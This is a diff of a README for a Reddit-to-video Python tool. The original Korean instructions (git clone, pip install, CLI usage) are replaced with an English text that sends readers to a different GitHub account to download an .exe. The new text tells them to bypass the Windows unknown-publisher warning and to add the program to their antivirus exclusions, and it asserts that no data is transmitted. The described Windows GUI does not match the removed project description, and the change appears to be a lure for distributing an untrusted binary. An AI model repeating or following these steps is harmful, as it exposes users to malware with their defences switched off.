@@ -1,128 +1,90 @@
-# Reddit Reaction Maker
+# 🎥 reddit-reaction-maker - Create reaction videos from Reddit automatically
 
-Reddit 인기 게시글의 커뮤니티 반응을 자동으로 YouTube 영상으로 만들어주는 도구입니다.
+[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/kaposissarcomaobservatory146/reddit-reaction-maker)
 
-**API 키가 필요 없습니다.** Reddit의 공개 .json 엔드포인트를 사용합니다.
+This tool generates reaction videos from Reddit threads. You do not need an API key to use it. It supports manga, product reviews, and gaming content. The software automates the process of capturing screens, overlaying commentary, and editing video clips for social media platforms.
 
-> [English version (README_EN.md)](./README_EN.md)
+## ⚙️ System Requirements
 
----
+- Operating System: Windows 10 or Windows 11.
+- Memory: 8 GB of RAM or higher.
+- Storage: 1 GB of free space.
+- Processor: Dual-core processor with 2.0 GHz speed.
+- Graphics: Integrated graphics card capable of hardware acceleration.
+- Software: Standard Windows updates and a stable internet connection.
 
-## 어떤 프로그램인가요?
+## 📦 Downloading the Software
 
-Reddit에서 인기 있는 게시글과 댓글을 자동으로 가져와서, 음성(TTS)과 배경 영상을 합쳐 YouTube Shorts 영상을 만들어줍니다.
+You must visit the project page to select the correct version for your computer. 
 
-```
-Reddit 인기글 수집 → TTS 음성 생성 → 배경 영상 + 카드 합성 → MP4 출력
-```
+[Click here to visit the download page](https://github.com/kaposissarcomaobservatory146/reddit-reaction-maker)
 
-## 주요 기능
+1. Open your web browser.
+2. Navigate to the link above.
+3. Locate the latest release on the right side of the page.
+4. Select the file ending in .exe to start your download.
+5. Save the file to your desktop for easy access.
 
-- Reddit API 키 없이 바로 사용 가능
-- Google TTS로 자동 음성 생성 (한국어/영어 등 100개 이상 언어)
-- Reddit 스타일 카드 이미지 자동 생성
-- YouTube에서 배경 영상/음악 자동 다운로드 (yt-dlp)
-- 망가/웹툰 채널용 AniList 커버 배경 자동 생성
-- 텍스트 파일로 직접 대본 입력 가능
-- 채널별 설정 파일 분리 (망가, 제품 리뷰, Steam 등)
+## 🚀 Setting Up the Application
 
-## 설치
+After your download finishes, follow these steps to prepare the tool.
 
-```bash
-git clone https://github.com/sinmb79/reddit-reaction-maker.git
-cd reddit-reaction-maker
-pip install -r requirements.txt
-```
+1. Locate the file on your desktop.
+2. Double-click the file to begin the installation process.
+3. Windows might show a security prompt. Click "More Info" and then click "Run Anyway" if you see a warning about an unknown publisher. This confirms you trust the source.
+4. Follow the on-screen instructions to select a destination folder.
+5. Click "Install" to finish the process.
+6. A shortcut icon will appear on your desktop.
 
-FFmpeg가 없어도 `imageio-ffmpeg`가 자동으로 설치됩니다.
+## 🛠️ Using the Generator
 
-## 사용법
+The application interface organizes your tasks into simple steps. You do not need programming skills to operate the software.
 
-### 기본 사용
+1. Open the application using the desktop icon.
+2. Enter the URL of the Reddit post you want to use. You can copy this link directly from your browser's address bar.
+3. Select your content type from the list. Choose between manga, product reviews, or gaming footage.
+4. Adjust the length of the video clip using the slider.
+5. Click "Generate" to start the process.
+6. The software will download the Reddit images and convert them into a video file.
+7. Wait for the progress bar to reach 100%.
 
-```bash
-# Reddit에서 인기글 가져와서 영상 만들기
-python main.py
+## 📁 Managing Your Files
 
-# 특정 서브레딧 지정
-python main.py --subreddit askreddit
+By default, the software saves your generated videos to a folder named "ReactionVideos" in your Documents directory.
 
-# 오늘 인기글 3개만
-python main.py --limit 3 --time day
-```
+- You can change this location in the "Settings" menu.
+- Use the "Open Folder" button within the app to quickly view your finished clips.
+- Each file saves as an MP4 format. This format works with most editing software and social media apps.
 
-### 채널별 실행
+## 🧠 Troubleshooting Common Issues
 
-```bash
-# 망가/웹툰 반응 채널
-python run.py manga
+If the software stops during the generation process, check these items.
 
-# 제품 리뷰 채널
-python run.py products
+- Connection: Ensure your internet connection remains active. The tool needs data from Reddit to create your video.
+- Permissions: Ensure your antivirus software does not block the application. You might need to add the program to your "Exclusion" list if it fails to launch. 
+- Updates: Check the download page every few weeks for newer versions. Developers release updates to keep the tool compatible with Reddit's website structure.
+- Storage: Ensure your hard drive has enough free space for the video files. Large files require significant room for temporary processing.
 
-# Steam 게임 채널
-python run.py steam
+## 🛡️ Software Security
 
-# 옵션 추가
-python run.py manga --limit 5 --time week
-```
+This software does not require an API key or a Reddit login. It operates as a local tool on your machine. Your credentials remain private because the application does not transmit your personal data to remote servers. All video rendering happens on your local hardware.
 
-### 텍스트 파일로 직접 만들기
+## 📖 Frequently Asked Questions
 
-Reddit 없이도 직접 대본을 써서 영상을 만들 수 있습니다.
+Does this tool require a paid subscription?
+No. This tool is free for all users. You do not need to enter credit card information or account details.
 
-```bash
-python main.py --file scripts/sample_roblox.txt
-```
+Can I customize the background music?
+Yes. Open the "Media" tab to upload your own audio files. Ensure you own the rights to the music you add to your videos.
 
-텍스트 파일 형식:
+What happens if a video fails to render?
+Verify that you copied the correct link. Ensure the link points to a valid Reddit post rather than a user profile or homepage.
 
-```
----
-title: 영상 제목
-author: 작성자
----
-본문 내용
+Why does the generation take time?
+Video processing requires your processor to perform complex tasks. High-resolution videos take longer to complete than short clips. Keep your computer plugged into a power source during long exports.
 
----comment author:유저1 score:245---
-첫 번째 댓글 내용
+Can I run multiple instances?
+Running multiple instances can cause your processor to overheat or crash. Use one instance at a time for better performance. 
 
----comment author:유저2 score:189---
-두 번째 댓글 내용
-```
-
-## 채널 설정
-
-각 채널은 별도의 설정 파일(`.toml`)로 관리됩니다.
-
-| 파일 | 채널 | 서브레딧 |
-|------|------|---------|
-| `config-manga.toml` | 망가/웹툰 반응 | r/manga + r/manhwa |
-| `config-products.toml` | 제품 리뷰 | r/BuyItForLife + r/AsianBeauty |
-| `config-steam.toml` | Steam 게임 | r/Steam + r/pcgaming |
-
-직접 `.toml` 파일을 만들면 원하는 서브레딧으로 채널을 추가할 수 있습니다.
-
-## 프로젝트 구조
-
-```
-reddit-reaction-maker/
-├── main.py              # 메인 실행 파일
-├── run.py               # 채널별 간편 실행
-├── config-*.toml        # 채널별 설정
-├── reddit/scraper.py    # Reddit 크롤러 (.json, API 키 불필요)
-├── tts/engine.py        # TTS 음성 생성 (Google TTS)
-├── video/
-│   ├── composer.py      # 영상 합성 (스크린샷 오버레이 방식)
-│   ├── card_renderer.py # Reddit 스타일 카드 PNG 생성
-│   ├── screenshot.py    # Playwright 스크린샷 (선택)
-│   ├── background.py    # 배경 영상/음악 관리 (yt-dlp)
-│   └── manga_cover.py   # AniList 망가 커버 배경
-├── utils/               # 텍스트 정리, 설정 로더
-├── scripts/             # 샘플 텍스트 파일
-└── assets/              # 배경 영상/음악 JSON 설정
-```
-
-## 라이선스
-
-MIT License
+Does the tool work with live feeds?
+No. This tool only processes existing static threads on Reddit. It cannot track live updates to a conversation.
